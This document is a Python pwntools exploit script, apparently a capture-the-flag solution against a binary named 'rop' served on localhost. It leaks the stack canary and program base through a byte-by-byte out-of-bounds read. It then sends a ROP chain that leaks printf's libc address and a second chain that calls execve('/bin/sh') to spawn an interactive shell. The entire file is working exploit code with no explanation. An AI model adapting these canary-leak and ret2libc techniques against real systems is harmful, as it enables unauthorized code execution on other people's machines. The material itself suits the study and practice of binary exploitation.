#!/usr/bin/env python3

from pwn import *
import binascii
import os

exe = context.binary = ELF("rop")

if args.REMOTE:
    libc = ELF("./libc-docker.so")
else:
    libc = ELF("/usr/lib/libc.so.6")

remotehost = ("127.0.0.1", 22226)

context.binary = exe.path
context.terminal = ['st', '-e', 'sh', '-c']

gdbscript = '''
b *main
continue
'''.format(**locals())


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(*remotehost, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


#################################################################

def read8bits(frase_offset):
    io.recvuntil("Cosa vuoi fare?\n")
    io.sendline("1")
    io.recvline()
    io.sendline(str(frase_offset))
    data = io.recvline(False)
    char = data.split(b"-")[1]
    
    return u8(char)

def read64bits(frase_offset, end=False):
    ret = list()
    for i in range(frase_offset, frase_offset+8):
        ret.append(read8bits(i))
    io.recvline()
    io.sendline("y" if not end else "n")

    return u64(fit(ret, word_size=8))


frase_canary_offset = 0x108
frase_main_36_offset = 0x118

io = start()

canary = read64bits(frase_canary_offset)
main_36 = read64bits(frase_main_36_offset, True)

exe.address = main_36 - (exe.sym.main + 36)

log.info("found canary: %x" % (canary, ))
log.info("exe base address: %x" % (exe.address, ))


R = ROP(exe)

name_rip_offset = 280
name_canary_offset = 280-16

R.call(exe.sym.puts, [exe.got.printf])
R.call(exe.sym.main)

io.recvline()
io.sendline(fit({
    name_canary_offset: canary,
    name_rip_offset: R.chain()
}))

io.recvline()

printf_libc = u64(io.recvline(False).ljust(8, b"\x00"))
libc.address = printf_libc - libc.sym.printf

log.info("printf@libc address: %x" % (printf_libc, ))
log.info("libc address: %x" % (libc.address, ))


io.recvline("Cosa vuoi fare?\n")
io.sendline("3")
io.recvline()
io.sendline("n")
io.recvline()


R = ROP([exe, libc])

R.call(libc.sym.execve, [next(libc.search(b"/bin/sh")), 0, 0])

io.sendline(fit({
    name_canary_offset: canary,
    name_rip_offset: R.chain()
}))



io.interactive()